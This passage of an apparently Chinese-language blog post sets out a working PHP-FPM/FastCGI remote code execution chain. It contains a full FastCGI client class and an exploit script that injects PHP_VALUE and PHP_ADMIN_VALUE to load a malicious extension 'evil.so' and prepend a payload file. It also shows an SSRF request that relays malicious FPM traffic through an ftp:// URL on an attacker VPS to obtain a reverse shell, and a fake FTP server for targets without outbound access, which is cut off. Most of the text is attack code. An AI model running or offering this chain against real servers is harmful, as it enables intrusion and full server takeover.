class="hljs-variable language_">$this</span>-&gt;_host = <span class="hljs-variable">$host</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;_port = <span class="hljs-variable">$port</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Define whether or not the FastCGI application should keep the connection</span><br><span class="hljs-comment">     * alive at the end of a request</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setKeepAlive</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;_keepAlive = (<span class="hljs-keyword">boolean</span>)<span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_keepAlive &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;_sock);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get the keep alive status</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getKeepAlive</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;_keepAlive;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Create a connection to the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_sock = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$this</span>-&gt;_host, <span class="hljs-variable">$this</span>-&gt;_port, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">5</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Unable to connect to FastCGI application&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build a FastCGI packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $type Type of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $content Content of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $requestId RequestId</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params"><span class="hljs-variable">$type</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$requestId</span> = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$clen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">VERSION_1</span>)         <span class="hljs-comment">/* version */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$type</span>)                    <span class="hljs-comment">/* type */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$requestId</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$requestId</span> &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$clen</span> &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xFF</span>)     <span class="hljs-comment">/* contentLengthB1 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$clen</span> &amp; <span class="hljs-number">0xFF</span>)             <span class="hljs-comment">/* contentLengthB0 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>            . <span class="hljs-variable">$content</span>;                     <span class="hljs-comment">/* content */</span><br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build an FastCGI Name value pair</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $name Name</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $value Value</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String FastCGI Name value pair</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$nlen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$name</span>);<br>        <span class="hljs-variable">$vlen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$nlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">24</span>) &#124; <span class="hljs-number">0x80</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$vlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">24</span>) &#124; <span class="hljs-number">0x80</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$vlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$nvpair</span> . <span class="hljs-variable">$name</span> . <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Decode a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $data String containing all the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decodePacketHeader</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;version&#x27;</span>]       = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">0</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;type&#x27;</span>]          = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">1</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;requestId&#x27;</span>]     = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">2</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">3</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">4</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">5</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">6</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;reserved&#x27;</span>]      = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">7</span>&#125;);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Read a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPacket</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$packet</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HEADER_LEN</span>)) &#123;<br>            <span class="hljs-variable">$resp</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">decodePacketHeader</span>(<span class="hljs-variable">$packet</span>);<br>            <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$len</span>  = <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>];<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$len</span> &amp;&amp; <span class="hljs-variable">$buf</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$len</span>)) &#123;<br>                    <span class="hljs-variable">$len</span> -= <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$buf</span>);<br>                    <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] .= <span class="hljs-variable">$buf</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$buf</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$resp</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Execute a request to the FastCGI application</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $params Array of parameters</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $stdin Content</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$params</span>, <span class="hljs-variable">$stdin</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>        <span class="hljs-variable">$request</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">BEGIN_REQUEST</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">RESPONDER</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$this</span>-&gt;_keepAlive) . <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>));<br>        <span class="hljs-variable">$paramsRequest</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-variable">$paramsRequest</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildNvpair</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$paramsRequest</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">PARAMS</span>, <span class="hljs-variable">$paramsRequest</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">PARAMS</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stdin</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDIN</span>, <span class="hljs-variable">$stdin</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDIN</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$request</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$resp</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">readPacket</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDOUT</span> &#124;&#124; <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDERR</span>) &#123;<br>                <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$resp</span> &amp;&amp; <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] != <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">END_REQUEST</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$resp</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Bad request&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">switch</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>]&#123;<span class="hljs-number">4</span>&#125;)) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CANT_MPX_CONN</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;This app can not multiplex [CANT_MPX_CONN]&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">OVERLOADED</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;New request rejected; too busy [OVERLOADED]&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">UNKNOWN_ROLE</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Role value not known [UNKNOWN_ROLE]&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">REQUEST_COMPLETE</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/************ config ************/</span><br><br><span class="hljs-comment">// your extension directory path</span><br><span class="hljs-variable">$ext_dir_path</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span>;<br><br><span class="hljs-comment">// your extension name</span><br><span class="hljs-variable">$ext_name</span> = <span class="hljs-string">&#x27;evil.so&#x27;</span>;  <span class="hljs-comment">//恶意so</span><br><br><span class="hljs-comment">// unix socket path or tcp host</span><br><span class="hljs-variable">$connect_path</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><br><span class="hljs-comment">// tcp connection port (unix socket: -1)</span><br><span class="hljs-variable">$port</span> = <span class="hljs-string">&quot;9000&quot;</span>;<br><br><span class="hljs-comment">// Don&#x27;t use this exploit file itself</span><br><span class="hljs-variable">$filepath</span> = <span class="hljs-string">&#x27;/var/www/html/index.php&#x27;</span>;<br><br><span class="hljs-comment">// your php payload location</span><br><span class="hljs-variable">$prepend_file_path</span> = <span class="hljs-string">&#x27;/tmp/1.txt&#x27;</span>;<br><br><span class="hljs-comment">/********************************/</span><br><br><span class="hljs-variable">$req</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filepath</span>);<br><span class="hljs-variable">$uri</span> = <span class="hljs-variable">$req</span>;<br><span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FCGIClient</span>(<span class="hljs-variable">$connect_path</span>, <span class="hljs-variable">$port</span>);<br><br><span class="hljs-comment">// disable open_basedir and open allow_url_include</span><br><span class="hljs-variable">$php_value</span> = <span class="hljs-string">&quot;allow_url_include = Onnopen_basedir = /nauto_prepend_file = &quot;</span> . <span class="hljs-variable">$prepend_file_path</span>;<br><span class="hljs-variable">$php_admin_value</span> = <span class="hljs-string">&quot;extension_dir=&quot;</span> . <span class="hljs-variable">$ext_dir_path</span> . <span class="hljs-string">&quot;nextension=&quot;</span> . <span class="hljs-variable">$ext_name</span>;<br><br><span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(       <br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="hljs-variable">$filepath</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="hljs-variable">$req</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="hljs-variable">$uri</span>,<br>        <span class="hljs-string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="hljs-variable">$req</span>,<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="hljs-variable">$php_value</span>,<br>         <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>   =&gt; <span class="hljs-variable">$php_admin_value</span>,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="hljs-string">&#x27;kaibro-fastcgi-rce&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        );<br><br><span class="hljs-comment">// print_r($_REQUEST);</span><br><span class="hljs-comment">// print_r($params);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Call: <span class="hljs-subst">$urinn</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">request</span>(<span class="hljs-variable">$params</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>4.利用file_put_contents()传payload到vps-ftp并转发到本地fpm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ftp.php?url=ftp://vps:9999/code.txt HTTP/1.1<br>............<br>payload=&lt;恶意fpm流量&gt;<br></code></pre></td></tr></table></figure><p>执行指令后反弹shell。</p><h5 id="目标不出网"><a href="#目标不出网" class="headerlink" title="目标不出网"></a>目标不出网</h5><p>与出网的区别就在于要在本地开一个evil_ftp转发流量，下面是php版本的evil_ftp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//evil_ftp.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$socket</span> = <span class="hljs-title function_ invoke__">stream_socket_server</span>(<span class="hljs-string">&quot;tcp://0.0.0.0:9999&quot;</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$socket</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&quot;[+] listening .......\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">stream_socket_accept</span>(<span class="hljs-variable">$socket</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&quot;[+] catch .......\n&quot;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;220 (vsFTPd 3.0.3)\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;331 Please specify the password.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;230 Login successful.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;200 Switching to Binary mode.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;550 Could not get file size.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;000 use PASV then\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;227 Entering Passive Mode (127,0,0,1,0,11451).\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;150 Ok to send data.\r\n&quot;</span>);<br>        <span class="hljs-comment">// sending payload ......</span><br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span 